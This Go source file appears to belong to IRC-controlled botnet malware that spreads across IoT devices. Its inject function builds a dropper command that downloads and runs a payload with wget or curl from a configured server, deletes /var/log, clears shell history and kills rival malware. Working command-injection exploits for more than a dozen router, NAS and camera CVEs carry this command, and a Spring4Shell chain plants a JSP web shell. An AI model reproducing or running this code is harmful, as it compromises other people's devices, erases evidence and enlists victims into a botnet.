package lib

import (
	"encoding/json"
	"net/http"
	"strings"
	"time"
)

func (b *Bot) inject(arch string, isExploit bool) string {
	if isExploit {
		b.password = "Infected by exploit"
	}
	switch arch {
	case "arm":
		server = &b.ARM_ARCH
	case "mips":
		server = &b.MIPS_ARCH
	default:
		server = &b.DEFAULT_ARCH
	}
	return "touch /var/tmp/" + fileName(false) + "; sudo printf \"" + b.password + "\\n" + b.tempIP + " [" + arch + "]" + "\\n\" > /var/tmp/" + fileName(false) + "; sudo rm -rf /var/log/; wget -O " + fileName(false) + " " + *server + " || curl -o " + fileName(false) + " " + *server + "; sudo history -c; sudo rm ~/.bash_history; sudo killall i .i mozi.m Mozi.m mozi.a Mozi.a kaiten Nbrute minerd; chmod 777 " + fileName(false) + "; sudo ./" + fileName(false) + " &"
}

func (e *Exploit) setupExploit(ip string) (*http.Client, *http.Request) {
	httpClient, httpReq, _ := setupHTTP(e.exploitMethod, "http://"+ip+"/", e.exploitPath, e.exploitBody)
	/*
		Default pre-setup header.
	*/
	httpReq.Header.Set("User-Agent", e.exploitAgent)
	httpReq.Header.Set("Accept", e.exploitAccept)
	httpReq.Header.Set("Content-Type", e.exploitContType)
	httpReq.Header.Set("Connection", e.exploitConnection)
	return httpClient, httpReq
}

func (b *Bot) selfRequest(exploit Exploit) *http.Request {
	_, selfReq := exploit.setupExploit(b.tempIP)
	return selfReq
}

func (b *Bot) exploitLauncher(exploit Exploit, exploitReq *http.Request) {
	if exploit.exploitName != "" {
		b.Report("Spraying " + exploit.exploitName + ": " + b.tempIP)
	}
	httpClient, _ := exploit.setupExploit(b.tempIP)
	httpClient.Do(exploitReq)
	time.Sleep(1 * time.Second) //Just carefully of IRC server getting flood.
}

func (b *Bot) CVE_2014_8361() {
	e8361 := Exploit{
		exploitName:       "CVE-2014-8361",
		exploitMethod:     "POST",
		exploitPath:       "picsdesc.xml",
		exploitBody:       strings.NewReader(string("<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"<http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping> xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`" + b.inject("mips", true) + "`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>")),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	_, newHeader := e8361.setupExploit(b.tempIP)
	newHeader.Header.Set("SOAPAction", "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping")
	b.exploitLauncher(e8361, newHeader)
}

func (b *Bot) CVE_2017_17215() {
	e17215 := Exploit{
		exploitName:       "CVE-2017-17215",
		exploitMethod:     "POST",
		exploitPath:       "ctrlt/DeviceUpgrade_1",
		exploitBody:       strings.NewReader(string("<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"<s:Body><u:Upgrade> xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox " + b.inject("mips", true) + ")</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>")),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	_, newHeader := e17215.setupExploit(b.tempIP)
	newHeader.Header.Set("Authorization", "Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"")
	b.exploitLauncher(e17215, newHeader)
}

func (b *Bot) CVE_2020_10987() {
	e10987 := Exploit{
		exploitName:       "CVE-2020-10987",
		exploitMethod:     "GET",
		exploitPath:       "goform/setUsbUnload/.js?deviceName=A;" + b.inject("", true),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	b.exploitLauncher(e10987, b.selfRequest(e10987))
}

func (b *Bot) CVE_2020_25506() {
	e25506 := Exploit{
		exploitName:       "CVE-2020-25506",
		exploitMethod:     "POST",
		exploitPath:       "cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`" + b.inject("arm", true) + "`",
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	b.exploitLauncher(e25506, b.selfRequest(e25506))
}

func (b *Bot) CVE_2021_35395() {
	e35395 := Exploit{
		exploitName:       "CVE-2021-35395",
		exploitMethod:     "POST",
		exploitPath:       "goform/formWsc",
		exploitBody:       strings.NewReader(string("submit-url=%2Fwlwps.asp&resetUnCfg=0&peerPin=12345678;" + b.inject("", true) + ";&setPIN=Start+PIN&configVxd=off&resetRptUnCfg=0&peerRptPin=")),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "close",
	}
	b.exploitLauncher(e35395, b.selfRequest(e35395))
}

func (b *Bot) CVE_2022_22965() {
	payload_execution := func() {
		e22965sub := Exploit{
			exploitName:       "",
			exploitMethod:     "POST",
			exploitPath:       "stupidRumor_war/index",
			exploitBody:       strings.NewReader(string("class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=")),
			exploitAgent:      "007",
			exploitAccept:     "*/*",
			exploitContType:   "application/x-www-form-urlencoded",
			exploitConnection: "keep-alive",
		}
		_, newHeader := e22965sub.setupExploit(b.tempIP)
		newHeader.Header.Set("suffix", "%>//")
		newHeader.Header.Set("c1", "Runtime")
		newHeader.Header.Set("c2", "<%")
		newHeader.Header.Set("DNT", "1")
		b.exploitLauncher(e22965sub, newHeader)
	}
	comamnd_injection := func() {
		e22965main := Exploit{
			exploitName:       "CVE-2022-22965",
			exploitMethod:     "GET",
			exploitPath:       "stupidRumor_war/tomcatwar.jsp?pwd=j&cmd=" + b.inject("", true),
			exploitAgent:      "007",
			exploitAccept:     "*/*",
			exploitContType:   "application/x-www-form-urlencoded",
			exploitConnection: "keep-alive",
		}
		b.exploitLauncher(e22965main, b.selfRequest(e22965main))
	}
	payload_execution()
	comamnd_injection()
}

func (b *Bot) CVE_2022_25075() {
	e25075 := Exploit{
		exploitName:       "CVE-2022-25075",
		exploitMethod:     "GET",
		exploitPath:       "cgi-bin/downloadFlile.cgi?payload=`" + b.inject("", true) + "`",
		exploitAgent:      "007",
		exploitAccept:     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	_, newHeader := e25075.setupExploit(b.tempIP)
	newHeader.Header.Set("Upgrade-Insecure-Requests", "1")
	newHeader.Header.Set("Cache-Control", "max-age=0")
	b.exploitLauncher(e25075, newHeader)
}

func (b *Bot) CVE_2022_26186() {
	e26186 := Exploit{
		exploitName:       "CVE-2022-26186",
		exploitMethod:     "POST",
		exploitPath:       "cgi-bin/cstecgi.cgi?exportOvpn=&type=user&comand=;" + b.inject("", true) + ";&filetype=sh",
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "close",
	}
	_, newHeader := e26186.setupExploit(b.tempIP)
	newHeader.Header.Set("Cookie", "SESSION_ID=2:1645507767:2")
	newHeader.Header.Set("Upgrade-Insecure-Requests", "1")
	b.exploitLauncher(e26186, newHeader)
}

func (b *Bot) CVE_2022_26210() {
	post26210, _ := json.Marshal(map[string]string{
		"topicurl":      "setting/setUpgradeFW",
		"FileName":      ";" + b.inject("", true),
		"Flags":         "1",
		"ContentLength": "1",
	})
	e26210 := Exploit{
		exploitName:       "CVE-2022-26210",
		exploitMethod:     "POST",
		exploitPath:       "cgi-bin/cstecgi.cgi",
		exploitBody:       strings.NewReader(string(post26210)),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/json",
		exploitConnection: "close",
	}
	_, newHeader := e26210.setupExploit(b.tempIP)
	newHeader.Header.Set("X-Requested-With", "XMLHttpRequest")
	newHeader.Header.Set("Cookie", "SESSION_ID=2:1645507767:2")
	b.exploitLauncher(e26210, newHeader)
}

func (b *Bot) CVE_2022_30525() {
	post30525, _ := json.Marshal(map[string]string{
		"command":     "setWanPortSt",
		"proto":       "dhcp",
		"port":        "4",
		"vlan_tagged": "1",
		"vlanid":      "5",
		"mtu":         b.inject("", true),
		"data":        "dota?",
	})
	e30525 := Exploit{
		exploitName:       "CVE-2022-30525",
		exploitMethod:     "POST",
		exploitPath:       "ztp/cgi-bin/handler",
		exploitBody:       strings.NewReader(string(post30525)),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/json",
		exploitConnection: "close",
	}
	b.exploitLauncher(e30525, b.selfRequest(e30525))
}

func (b *Bot) CVE_2022_34538() {
	e34538 := Exploit{
		exploitName:       "CVE-2022-34538",
		exploitMethod:     "GET",
		exploitPath:       "cgi-bin/admin/vca/bia/addacph.cgi?mod&event=a&id=1&pluginname=;" + b.inject("", true) + ";&name=a&evt_id=a",
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "close",
	}
	b.exploitLauncher(e34538, b.selfRequest(e34538))
}

func (b *Bot) TOTOlink_A7100RU(topicurl, cveNumber string) {
	post, _ := json.Marshal(map[string]string{
		"topicurl":    "setting/" + topicurl,
		"wscDisabled": "1$(" + b.inject("mips", true) + ";)",
	})
	e := Exploit{
		exploitName:       "CVE-2022-" + cveNumber,
		exploitMethod:     "POST",
		exploitPath:       "cgi-bin/cstecgi.cgi",
		exploitBody:       strings.NewReader(string(post)),
		exploitAgent:      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urencoded; charset=UTF-8",
		exploitConnection: "close",
	}
	_, newHeader := e.setupExploit(b.tempIP)
	newHeader.Header.Set("X-Requested-With", "XMLHttpRequest")
	newHeader.Header.Set("Origin", "http://"+b.tempIP)
	newHeader.Header.Set("Referer", "http://"+b.tempIP+"/adm/status.asp?timestamp=1647872753309")
	newHeader.Header.Set("Accept-Encoding", "gzip, deflate")
	newHeader.Header.Set("Accept-Language", "zh-CN,zh;q=0.9")
	newHeader.Header.Set("Cookie", "SESSION_ID=2:1647872744:2")
	b.exploitLauncher(e, newHeader)
}

func (b *Bot) CVE_2022_46631() { b.TOTOlink_A7100RU("setWiFiWpsCfg", "46631") }
func (b *Bot) CVE_2022_46634() { b.TOTOlink_A7100RU("setWiFiSignalCfg", "46634") }

func (b *Bot) ZSL_2022_5717() {
	zsl5717 := Exploit{
		exploitName:       "ZSL-2022-5717",
		exploitMethod:     "GET",
		exploitPath:       "?site=about&name=ZSL&file=$(" + b.inject("", true) + ")",
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "close",
	}
	b.exploitLauncher(zsl5717, b.selfRequest(zsl5717))
}

func (b *Bot) exploitList() {
	b.CVE_2014_8361()
	b.CVE_2017_17215()
	b.CVE_2020_10987()
	b.CVE_2020_25506()
	b.CVE_2021_35395()
	b.CVE_2022_22965()
	b.CVE_2022_25075()
	b.CVE_2022_26186()
	b.CVE_2022_26210()
	b.CVE_2022_30525()
	b.CVE_2022_34538()
	b.CVE_2022_46631()
	b.CVE_2022_46634()
	b.ZSL_2022_5717()
}
